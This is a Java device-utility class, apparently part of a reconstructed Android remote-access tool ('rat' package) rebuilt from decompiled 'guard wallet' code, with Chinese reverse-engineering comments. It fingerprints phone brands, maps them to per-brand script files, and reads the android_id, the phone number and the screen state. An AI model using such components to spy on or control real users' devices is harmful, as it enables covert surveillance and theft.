package com.vendor.rat.utils;

import android.content.Context;
import android.content.res.Resources;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.util.Locale;

/**
 * 设备工具类
 *
 * 基于逆向分析: com/guard/wallet/utils/e.java (367 行) — 完整对齐
 *
 * 字段:
 *   - f283a (deviceId) → cachedDeviceId
 *   - b (Integer 0) → navigationBarHeight
 *
 * 方法 (14 个):
 *   - a() → getJsFileName()          品牌→JS文件名映射 (20 品牌)
 *   - b() → getActivity()            获取当前 Activity (简化)
 *   - c() → getDeviceId()            获取设备唯一 ID
 *   - d() → getLanguageTag()         获取语言标签
 *   - e() → getScreenMetrics()       获取屏幕参数 (反编译失败, 占位)
 *   - f() → extractLanguage()        提取语言代码
 *   - g() → isHuawei()              华为/荣耀/Wiko 检测
 *   - h() → isHarmonyOS()           鸿蒙系统检测
 *   - i() → isOppo()                OPPO/realme/OnePlus 检测
 *   - j() → isScreenInteractive()   屏幕是否亮屏
 *   - k() → isTecno()               Tecno/itel/Infinix 检测
 *   - l() → isVivo()                vivo/iQOO 检测
 *   - m() → isXiaomi()              小米/红米/POCO/黑鲨 检测
 *   - n() → getPhoneNumber()        获取手机号
 *
 * 品牌检测:
 *   - isXiaomi: xiaomi/redmi/poco/blackshark
 *   - isHuawei: huawei/honor/wiko
 *   - isOppo: oppo/realme/oneplus
 *   - isVivo: vivo/iqoo
 *   - isTecno: tecno/itel/infinix
 *   - isSamsung: samsung
 */
public class DeviceUtils {

    private static final String TAG = "DeviceUtils";

    // ADAPT: vendor 使用 f283a, 这里用可读名
    private static String cachedDeviceId;

    // ADAPT: vendor 使用 Integer b = 0, 用途不明确
    public static Integer navigationBarHeight = 0;

    // ====== 厂商 ID 常量 ======
    public static final int VENDOR_XIAOMI = 0;
    public static final int VENDOR_HUAWEI = 1;
    public static final int VENDOR_OPPO = 2;
    public static final int VENDOR_VIVO = 3;
    public static final int VENDOR_SAMSUNG = 4;
    public static final int VENDOR_MEIZU = 5;
    public static final int VENDOR_LENOVO = 6;
    public static final int VENDOR_ZTE = 7;
    public static final int VENDOR_NUBIA = 8;
    public static final int VENDOR_ONEPLUS = 9;
    public static final int VENDOR_REALME = 10;
    public static final int VENDOR_HONOR = 11;
    public static final int VENDOR_IQOO = 12;
    public static final int VENDOR_REDMI = 13;
    public static final int VENDOR_UNKNOWN = 14;

    // ============ a() → getJsFileName ============

    /**
     * 品牌→JS 文件名映射
     * 对应逆向: e.a() — 20 个品牌 switch
     */
    public static String getJsFileName() {
        String brand = getBrand();
        if (brand == null || brand.isEmpty()) {
            return "android.js";
        }
        switch (brand) {
            case "blackshark": return "blackshark.js";
            case "oneplus":    return "oneplus.js";
            case "google":     return "google.js";
            case "huawei":     return "huawei.js";
            case "realme":     return "realme.js";
            case "xiaomi":     return "xiaomi.js";
            case "motorola":   return "motorola.js";
            case "iqoo":       return "iqoo.js";
            case "itel":       return "itel.js";
            case "oppo":       return "oppo.js";
            case "poco":       return "poco.js";
            case "sony":       return "sony.js";
            case "vivo":       return "vivo.js";
            case "wiko":       return "wiko.js";
            case "honor":      return "honor.js";
            case "meizu":      return "meizu.js";
            case "redmi":      return "redmi.js";
            case "tecno":      return "tecno.js";
            case "samsung":    return "samsung.js";
            case "infinix":    return "infinix.js";
            default:           return "android.js";
        }
    }

    // ============ c() → getDeviceId ============

    /**
     * 获取设备唯一 ID (android_id)
     * 对应逆向: e.c() — synchronized + 缓存 + SharedPreferences
     *
     * ADAPT: vendor 使用 h.l("DEVICE_UNIQUE_ID") 从 SP 读取,
     *        这里简化为直接读 Settings.Secure
     */
    public static synchronized String getDeviceId(Context context) {
        if (cachedDeviceId == null) {
            try {
                if (context != null) {
                    // TODO: VENDOR_VERIFY — vendor 先从 SharedPreferences 读取
                    String androidId = Settings.Secure.getString(
                        context.getContentResolver(), "android_id");
                    cachedDeviceId = androidId;
                }
            } catch (Exception e) {
                Log.e(TAG, "getDeviceId error", e);
            }
        }
        return cachedDeviceId;
    }

    // ============ d() → getLanguageTag ============

    /**
     * 获取语言标签
     * 对应逆向: e.d(Context) — locale.toLanguageTag() 或 locale.getLanguage()
     */
    public static String getLanguageTag(Context context) {
        if (context == null) {
            return null;
        }
        try {
            if (context.getResources() == null
                    || context.getResources().getConfiguration() == null) {
                return null;
            }
            Locale locale = context.getResources().getConfiguration().locale;
            if (locale == null) {
                return null;
            }
            String tag = locale.toLanguageTag();
            return (tag != null && !tag.isEmpty()) ? tag : locale.getLanguage();
        } catch (Exception e) {
            Log.e(TAG, "getLanguageTag error", e);
            return null;
        }
    }

    // ============ f() → extractLanguage ============

    /**
     * 从语言标签提取语言代码 (取 "-" 前部分)
     * 对应逆向: e.f(String) — split("-")[0]
     */
    public static String extractLanguage(String languageTag) {
        if (languageTag == null || languageTag.isEmpty() || !languageTag.contains("-")) {
            return languageTag;
        }
        String[] parts = languageTag.split("-");
        return parts.length > 1 ? parts[0] : languageTag;
    }

    // ============ g() → isHuawei ============

    /**
     * 华为/荣耀/Wiko 品牌检测
     * 对应逆向: e.g() — huawei/honor/wiko
     */
    public static boolean isHuawei() {
        String brand = getBrand();
        return "huawei".equals(brand) || "honor".equals(brand) || "wiko".equals(brand);
    }

    // ============ h() → isHarmonyOS ============

    /**
     * 鸿蒙系统检测
     * 对应逆向: e.h() — 读取 config_os_brand 系统资源
     */
    public static boolean isHarmonyOS(Context context) {
        if (context == null || !isHuawei()) {
            return false;
        }
        try {
            int resId = Resources.getSystem().getIdentifier(
                "config_os_brand", "string", "android");
            if (resId == 0) return false;
            String osBrand = context.getString(resId);
            if (osBrand == null || osBrand.isEmpty()) {
                return false;
            }
            return osBrand.toLowerCase().contains("harmony");
        } catch (Exception e) {
            Log.e(TAG, "isHarmonyOS error", e);
            return false;
        }
    }

    // ============ i() → isOppo ============

    /**
     * OPPO/realme/OnePlus 品牌检测
     * 对应逆向: e.i() — oppo/realme/oneplus
     */
    public static boolean isOppo() {
        String brand = getBrand();
        return "oppo".equals(brand) || "realme".equals(brand) || "oneplus".equals(brand);
    }

    // ============ j() → isScreenInteractive ============

    /**
     * 屏幕是否亮屏 (交互状态)
     * 对应逆向: e.j() — PowerManager.isInteractive()
     */
    public static boolean isScreenInteractive(Context context) {
        if (context == null) {
            return false;
        }
        try {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            return pm != null && pm.isInteractive();
        } catch (Exception e) {
            Log.e(TAG, "isScreenInteractive error", e);
            return false;
        }
    }

    // ============ k() → isTecno ============

    /**
     * Tecno/itel/Infinix 品牌检测
     * 对应逆向: e.k() — tecno/itel/infinix
     */
    public static boolean isTecno() {
        String brand = getBrand();
        return "tecno".equals(brand) || "itel".equals(brand) || "infinix".equals(brand);
    }

    // ============ l() → isVivo ============

    /**
     * vivo/iQOO 品牌检测
     * 对应逆向: e.l() — vivo/iqoo
     */
    public static boolean isVivo() {
        String brand = getBrand();
        return "vivo".equals(brand) || "iqoo".equals(brand);
    }

    // ============ m() → isXiaomi ============

    /**
     * 小米/红米/POCO/黑鲨 品牌检测
     * 对应逆向: e.m() — redmi/xiaomi/poco/blackshark
     */
    public static boolean isXiaomi() {
        String brand = getBrand();
        return "redmi".equals(brand) || "xiaomi".equals(brand)
            || "poco".equals(brand) || "blackshark".equals(brand);
    }

    // ============ isSamsung ============

    /**
     * 三星品牌检测
     * ADAPT: vendor 没有单独的 isSamsung, 但 a() 中有 samsung 分支
     */
    public static boolean isSamsung() {
        return "samsung".equals(getBrand());
    }

    // ============ n() → getPhoneNumber ============

    /**
     * 获取手机号
     * 对应逆向: e.n() — TelephonyManager.getLine1Number()
     *
     * ADAPT: 需要 READ_PHONE_STATE 权限
     */
    public static String getPhoneNumber(Context context) {
        if (context == null) {
            return null;
        }
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm == null) {
                return null;
            }
            // TODO: VENDOR_VERIFY — vendor 检查 READ_PHONE_STATE 权限
            return tm.getLine1Number();
        } catch (Exception e) {
            Log.e(TAG, "getPhoneNumber error", e);
            return null;
        }
    }

    // ============ 厂商 ID ============

    /**
     * 获取厂商 ID
     */
    public static int getVendorId() {
        String brand = getBrand();

        if ("xiaomi".equals(brand)) return VENDOR_XIAOMI;
        if ("redmi".equals(brand)) return VENDOR_REDMI;
        if ("huawei".equals(brand)) return VENDOR_HUAWEI;
        if ("honor".equals(brand)) return VENDOR_HONOR;
        if ("oppo".equals(brand)) return VENDOR_OPPO;
        if ("realme".equals(brand)) return VENDOR_REALME;
        if ("oneplus".equals(brand)) return VENDOR_ONEPLUS;
        if ("vivo".equals(brand)) return VENDOR_VIVO;
        if ("iqoo".equals(brand)) return VENDOR_IQOO;
        if ("samsung".equals(brand)) return VENDOR_SAMSUNG;
        if ("meizu".equals(brand)) return VENDOR_MEIZU;
        if ("lenovo".equals(brand)) return VENDOR_LENOVO;
        if ("zte".equals(brand)) return VENDOR_ZTE;
        if ("nubia".equals(brand)) return VENDOR_NUBIA;

        return VENDOR_UNKNOWN;
    }

    /**
     * 获取品牌名称
     */
    public static String getBrandName() {
        if (isXiaomi()) return "Xiaomi";
        if (isHuawei()) return "Huawei";
        if (isOppo()) return "OPPO";
        if (isVivo()) return "vivo";
        if (isSamsung()) return "Samsung";
        if (isTecno()) return "Tecno";
        return "Unknown (" + (Build.BRAND != null ? Build.BRAND : "null") + ")";
    }

    /**
     * 获取厂商名称 (更细粒度)
     */
    public static String getVendorName() {
        int vendorId = getVendorId();
        switch (vendorId) {
            case VENDOR_XIAOMI: return "Xiaomi";
            case VENDOR_REDMI: return "Redmi";
            case VENDOR_HUAWEI: return "Huawei";
            case VENDOR_HONOR: return "Honor";
            case VENDOR_OPPO: return "OPPO";
            case VENDOR_REALME: return "Realme";
            case VENDOR_ONEPLUS: return "OnePlus";
            case VENDOR_VIVO: return "vivo";
            case VENDOR_IQOO: return "iQOO";
            case VENDOR_SAMSUNG: return "Samsung";
            case VENDOR_MEIZU: return "Meizu";
            case VENDOR_LENOVO: return "Lenovo";
            case VENDOR_ZTE: return "ZTE";
            case VENDOR_NUBIA: return "Nubia";
            default: return Build.MANUFACTURER != null ? Build.MANUFACTURER : "Unknown";
        }
    }

    // ============ 内部方法 ============

    /**
     * 安全获取 Build.BRAND (小写)
     * ADAPT: vendor 使用 Build.BRAND.toLowerCase(), 这里处理 null (JVM 测试)
     */
    private static String getBrand() {
        return Build.BRAND != null ? Build.BRAND.toLowerCase() : "";
    }

    /**
     * 安全获取 Build.MANUFACTURER (小写)
     */
    private static String getManufacturer() {
        return Build.MANUFACTURER != null ? Build.MANUFACTURER.toLowerCase() : "";
    }

    /**
     * 获取导航栏高度
     * ADAPT: vendor e.e() 中使用, 反编译失败的方法
     */
    public Integer getNavigationBarHeight() {
        return navigationBarHeight;
    }
}
